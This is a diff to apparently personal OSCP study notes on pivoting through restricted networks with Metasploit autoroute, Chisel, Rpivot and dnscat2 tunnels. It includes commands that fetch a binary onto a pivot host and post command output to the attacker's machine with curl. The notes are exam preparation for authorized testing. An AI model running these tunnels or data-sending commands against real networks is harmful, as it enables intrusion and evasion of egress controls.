@@ -138,7 +138,7 @@ set SRVPORT 9050; set SRVHOST 0.0.0.0; set VERSION 4a
 run
 
 sessions -i 1
-run autoroute -s <target-subnet>/<mask>
+run autoroute -s $BoxIP/<mask>
 ```
 
 → proxychains.conf: `socks4 127.0.0.1 9050`, then `proxychains nmap -sT -Pn -n ...` as normal.
@@ -162,19 +162,19 @@ When the target environment has strict egress filtering, SSH may not work. Match
 ### Only HTTP outbound allowed → Rpivot or Chisel
 
 **Rpivot:** `server.py` on Kali (port 9999 + SOCKS on 9050), `client.py` on pivot (Python 2.7).
-**Chisel reverse:** `chisel server --reverse` on Kali, `chisel client <kali-ip>:PORT R:socks` on pivot, creates SOCKS5 on Kali port 1080.
+**Chisel reverse:** `chisel server --reverse` on Kali, `chisel client $LocalIP:PORT R:socks` on pivot, creates SOCKS5 on Kali port 1080.
 → Both require updating proxychains.conf (socks4 9050 for Rpivot, socks5 1080 for Chisel).
 → SSH through SOCKS doesn't use proxychains. Use `ProxyCommand` with ncat instead: `ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@host`
 → Full syntax: [[Port Redirection and SSH Tunneling#Chisel Reverse SOCKS (HTTP Tunnel. DPI Bypass, Server on Kali)|Command Appendix]], [[Chisel]]
 
-**glibc mismatch on older targets:** Newer Kali builds Chisel with Go 1.20+ which requires glibc 2.32/2.34. If the pivot has an older glibc, download the Go 1.19 compiled release: `wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz`. Detect using the error collection pattern: `<cmd> &> /tmp/out; curl --data @/tmp/out http://<kali>:<port>/`
+**glibc mismatch on older targets:** Newer Kali builds Chisel with Go 1.20+ which requires glibc 2.32/2.34. If the pivot has an older glibc, download the Go 1.19 compiled release: `wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz`. Detect using the error collection pattern: `<cmd> &> /tmp/out; curl --data @/tmp/out http://$LocalIP:$Port/`
 
 ### Only DNS outbound allowed → Dnscat2
 
 → Requires a domain you control with your server as the authoritative NS (or a lab pre-configured for this).
 → **Server:** `dnscat2-server feline.corp` on the auth NS host (needs sudo for UDP/53). **Client:** `./dnscat feline.corp` (Linux binary) or `Start-Dnscat2` PS module (Windows).
 → Very slow. Session drops after ~20 unanswered DNS queries, run `window -i 1` and `listen` immediately on session connect.
-→ **Port forwarding through DNS tunnel:** `listen [0.0.0.0:]<localport> <rhost>:<rport>`, like ssh -L. Use `0.0.0.0` if the destination tool (e.g. Kali) needs to connect to the auth NS host's port rather than localhost.
+→ **Port forwarding through DNS tunnel:** `listen [0.0.0.0:]$Port $BoxIP:$Port`, like ssh -L. Use `0.0.0.0` if the destination tool (e.g. Kali) needs to connect to the auth NS host's port rather than localhost.
 → **When tool hardcodes 127.0.0.1:** combine dnscat2 `listen 0.0.0.0:PORT` on the auth NS with `ssh -fNL PORT:127.0.0.1:PORT user@auth-ns-host` on Kali to bridge the port to Kali's loopback.
 → Full syntax: [[Port Redirection and SSH Tunneling#dnscat2 Linux Setup (Auth NS + Binary Client)|Command Appendix]], [[Dnscat2]]
 
@@ -210,3 +210,14 @@ When the target environment has strict egress filtering, SSH may not work. Match
 - [RevShells](https://www.revshells.com/) for shell troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for transformations
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/19. Port Redirection and SSH Tunneling]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
